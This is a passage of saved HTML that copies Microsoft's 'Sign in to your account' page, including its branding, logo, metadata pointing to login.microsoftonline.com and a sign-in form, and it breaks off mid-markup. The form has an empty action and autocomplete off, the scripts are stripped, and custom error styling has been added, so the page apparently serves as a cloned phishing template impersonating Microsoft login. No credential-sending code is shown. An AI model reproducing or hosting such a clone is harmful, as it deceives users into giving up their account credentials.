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) format('woff2');
        }

        @font-face {
            font-weight: 500;
            font-style: normal;
            font-family: 'Circular-Loom';

            src:
                /*savepage-url=https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Medium-d74eac43c78bd5852478998ce63dceb3.woff2*/
                url() format('woff2');
        }

        @font-face {
            font-weight: 700;
            font-style: normal;
            font-family: 'Circular-Loom';

            src:
                /*savepage-url=https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Bold-83b8ceaf77f49c7cffa44107561909e4.woff2*/
                url() format('woff2');
        }

        @font-face {
            font-weight: 900;
            font-style: normal;
            font-family: 'Circular-Loom';

            src:
                /*savepage-url=https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Black-bf067ecb8aa777ceb6df7d72226febca.woff2*/
                url() format('woff2');
        }

    </style>
    <link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_59_uuouser7hrkmvbaz1jw2.css">
    <link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_dvvcidi7adxn_soxvlb4_w2.js">
    <style id="savepage-cssvariables">
        :root {
            --savepage-url-10: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIwIiBoZWlnaHQ9IjEwODAiIGZpbGw9Im5vbmUiPjxnIG9wYWNpdHk9Ii4yIiBjbGlwLXBhdGg9InVybCgjRSkiPjxwYXRoIGQ9Ik0xNDY2LjQgMTc5NS4yYzk1MC4zNyAwIDE3MjAuOC02MjcuNTIgMTcyMC44LTE0MDEuNlMyNDE2Ljc3LTEwMDggMTQ2Ni40LTEwMDgtMjU0LjQtMzgwLjQ4Mi0yNTQuNCAzOTMuNnM3NzAuNDI4IDE0MDEuNiAxNzIwLjggMTQwMS42eiIgZmlsbD0idXJsKCNBKSIvPjxwYXRoIGQ9Ik0zOTQuMiAxODE1LjZjNzQ2LjU4IDAgMTM1MS44LTQ5My4yIDEzNTEuOC0xMTAxLjZTMTE0MC43OC0zODcuNiAzOTQuMi0zODcuNi05NTcuNiAxMDUuNjAzLTk1Ny42IDcxNC0zNTIuMzggMTgxNS42IDM5NC4yIDE4MTUuNnoiIGZpbGw9InVybCgjQikiLz48cGF0aCBkPSJNMTU0OC42IDE4ODUuMmM2MzEuOTIgMCAxMTQ0LjItNDE3LjQ1IDExNDQuMi05MzIuNFMyMTgwLjUyIDIwLjQgMTU0OC42IDIwLjQgNDA0LjQgNDM3Ljg1IDQwNC40IDk1Mi44czUxMi4yNzYgOTMyLjQgMTE0NC4yIDkzMi40eiIgZmlsbD0idXJsKCNDKSIvPjxwYXRoIGQ9Ik0yNjUuOCAxMjE1LjZjNjkwLjI0NiAwIDEyNDkuOC00NTUuNTk1IDEyNDkuOC0xMDE3LjZTOTU2LjA0Ni04MTkuNiAyNjUuOC04MTkuNi05ODQtMzY0LjAwNS05ODQgMTk4LTQyNC40NDUgMTIxNS42IDI2NS44IDEyMTUuNnoiIGZpbGw9InVybCgjRCkiLz48L2c+PGRlZnM+PHJhZGlhbEdyYWRpZW50IGlkPSJBIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDE0NjYuNCAzOTMuNikgcm90YXRlKDkwKSBzY2FsZSgxNDAxLjYgMTcyMC44KSI+PHN0b3Agc3RvcC1jb2xvcj0iIzEwN2MxMCIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2M0YzRjNCIgc3RvcC1vcGFjaXR5PSIwIi8+PC9yYWRpYWxHcmFkaWVudD48cmFkaWFsR3JhZGllbnQgaWQ9IkIiIGN4PSIwIiBjeT0iMCIgcj0iMSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMzk0LjIgNzE0KSByb3RhdGUoOTApIHNjYWxlKDExMDEuNiAxMzUxLjgpIj48c3RvcCBzdG9wLWNvbG9yPSIjMDA3OGQ0Ii8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjYzRjNGM0IiBzdG9wLW9wYWNpdHk9IjAiLz48L3JhZGlhbEdyYWRpZW50PjxyYWRpYWxHcmFkaWVudCBpZD0iQyIgY3g9IjAiIGN5PSIwIiByPSIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSgxNTQ4LjYgOTUyLjgpIHJvdGF0ZSg5MCkgc2NhbGUoOTMyLjQgMTE0NC4yKSI+PHN0b3Agc3RvcC1jb2xvcj0iI2ZmYjkwMCIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PHJhZGlhbEdyYWRpZW50IGlkPSJEIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDI2NS44IDE5OCkgcm90YXRlKDkwKSBzY2FsZSgxMDE3LjYgMTI0OS44KSI+PHN0b3Agc3RvcC1jb2xvcj0iI2Q4M2IwMSIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJFIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwaDE5MjB2MTA4MEgweiIvPjwvY2xpcFBhdGg+PC9kZWZzPjwvc3ZnPg==);
        }

    </style>

    <meta name="savepage-url" content="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https://www.office.com/landing&response_type=code id_token&scope=openid profile&response_mode=form_post&nonce=637431469571284649.NzlkMzk5NzUtNDZjMy00OWNhLWE5YWQtMjJmZjAyYjQ4MjU1Mjk2MzE3ODgtY2E1ZC00NTcyLTg5Y2QtNzAzYzhmYmY4MTU3&ui_locales=en-US&mkt=en-US&client-request-id=608af1f5-428c-4602-9996-188c8e77d84b&state=ioTltKrJ8-Y3GgDyKH1fSotG7lBn7BTqYQ0LSEgCDvwqz3qmMqIYmF9H9ybaxToAmQI8geKj4UOuvAeZp22oJUe9LijyFo_UsT60Uhd2-4aYsSgZkBjUfMyrwRJZCRYV7wnEjy3pzrMNfrR8y3ZZSVfsxnZRl37eiFt0w2IF5uQInuAIUPD2SaGG-4p36GHWxwoe8pDbSRwg8ROti_0lNHOYgR6bCg5LPJme6wm8QstbtCPDN_jxxFjc4YFOx3lDvsMg9aypn7l2r41mGFlYaw&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.6.0.0#">
    <meta name="savepage-title" content="Sign in to your account">
    <meta name="savepage-from" content="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https://www.office.com/landing&response_type=code id_token&scope=openid profile&response_mode=form_post&nonce=637431469571284649.NzlkMzk5NzUtNDZjMy00OWNhLWE5YWQtMjJmZjAyYjQ4MjU1Mjk2MzE3ODgtY2E1ZC00NTcyLTg5Y2QtNzAzYzhmYmY4MTU3&ui_locales=en-US&mkt=en-US&client-request-id=608af1f5-428c-4602-9996-188c8e77d84b&state=ioTltKrJ8-Y3GgDyKH1fSotG7lBn7BTqYQ0LSEgCDvwqz3qmMqIYmF9H9ybaxToAmQI8geKj4UOuvAeZp22oJUe9LijyFo_UsT60Uhd2-4aYsSgZkBjUfMyrwRJZCRYV7wnEjy3pzrMNfrR8y3ZZSVfsxnZRl37eiFt0w2IF5uQInuAIUPD2SaGG-4p36GHWxwoe8pDbSRwg8ROti_0lNHOYgR6bCg5LPJme6wm8QstbtCPDN_jxxFjc4YFOx3lDvsMg9aypn7l2r41mGFlYaw&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.6.0.0#">
    <meta name="savepage-date" content="Wed Dec 09 2020 15:43:06 GMT-0600 (Central Standard Time)">
    <meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
    <meta name="savepage-version" content="23.8">
    <meta name="savepage-comments" content="">

    <style>
        input.error.fail-alert {
            border-bottom: 1px solid red;
            outline: none;
        }

        label.error.fail-alert {
            color: red;
            font-size: 12px;
        }

        input.error.fail-alert:focus {
            border-bottom: 1px solid red;
            outline: none;
            color: #000;
        }

    </style>
</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-new-gr-c-s-check-loaded="14.984.0" data-gr-ext-installed="">
    <script type="text/javascript"></script>
    <script type="text/javascript"></script>


    <div>
        <!--  -->
        <!--  -->
        <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
            <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                <!-- ko if: smallImageUrl -->
                <!-- /ko -->
                <!-- ko if: backgroundImageUrl -->
                <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: /*savepage-url=https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg*/ var(--savepage-url-10);"></div> <!-- ko if: useImageMask -->
                <!-- /ko -->
                <!-- /ko -->
            </div>
        </div>
        <div data-bind="if: activeDialog"></div>
        <form name="loginform" id="loginform" spellcheck="false" method="post" autocomplete="off" action="">
            <!-- ko if: svr.iBannerEnvironment -->
            <!-- /ko -->
            <!-- ko withProperties: { '$loginPage': $data } -->
            <div class="outer" data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
                <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                <!-- ko if: svr.fShowCookieBanner -->
                <!-- /ko -->
                <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
                    <!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                    <!-- /ko -->
                    <!-- ko if: svr.fShowPageLevelTitleAndDesc && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hidePageLevelTitleAndDesc')) -->
                    <!-- /ko -->
                    <div data-bind="
                animationEnd: paginationControlMethods() && paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButtons,
                    'transparent-lightbox': backgroundControlMethods() && backgroundControlMethods().useTransparentLightBox },
                externalCss: { 'sign-in-box': true }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox && showLightboxProgress() }"></div> <!-- ko if: showLightboxProgress -->
                        <!-- /ko -->
                        <div class="win-scroll">
                            <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                            <div data-bind="component: { name: 'logo-control',
                        params: {
                            isChinaDc: svr.fIsChinaDc,
                            bannerLogoUrl: bannerLogoUrl() } }">
                                <!--  -->
                                <!-- ko if: bannerLogoUrl -->
                                <!-- /ko -->
                                <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                                <!-- ko component: 'accessible-image-control' -->
                                <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                <!-- /ko -->
                                <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" data-savepage-src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
                                <!-- /ko -->
                                <!-- /ko -->
                                <!-- /ko -->
                            </div> <!-- /ko -->
                            <!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
                            <!-- /ko -->
                            <!-- ko if: asyncInitReady -->
                            <div role="main" data-bind="component: { name: 'pagination-control',
                            publicMethods: paginationControlMethods,
                            params: {
                                enableCssAnimation: svr.fEnableCssAnimation,
                                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                                initialViewId: initialViewId,
                                currentViewId: currentViewId,
                                initialSharedData: initialSharedData,
                                initialError: $loginPage.getServerError() },
                            event: {
                                cancel: paginationControl_onCancel,
                            loadView: view_onLoadView,
                            showView: view_onShow,
                                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                                animationStateChange: paginationControl_onAnimationStateChange } }">
                                <!--  -->
                                <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                                    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
                                    <!-- /ko -->
                                    <div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">
                                        <!-- ko foreach: views -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- ko template: { nodes: [$data], data: $parent } -->
                                        <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                            params: {
                                serverData: svr,
                                serverError: initialError,
                                isInitialView: isInitialState,
                                displayName: sharedData.displayName,
                                otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                                prefillNames: $loginPage.prefillNames,
                                flowToken: sharedData.flowToken,
                                availableSignupCreds: sharedData.availableSignupCreds },
                            event: {
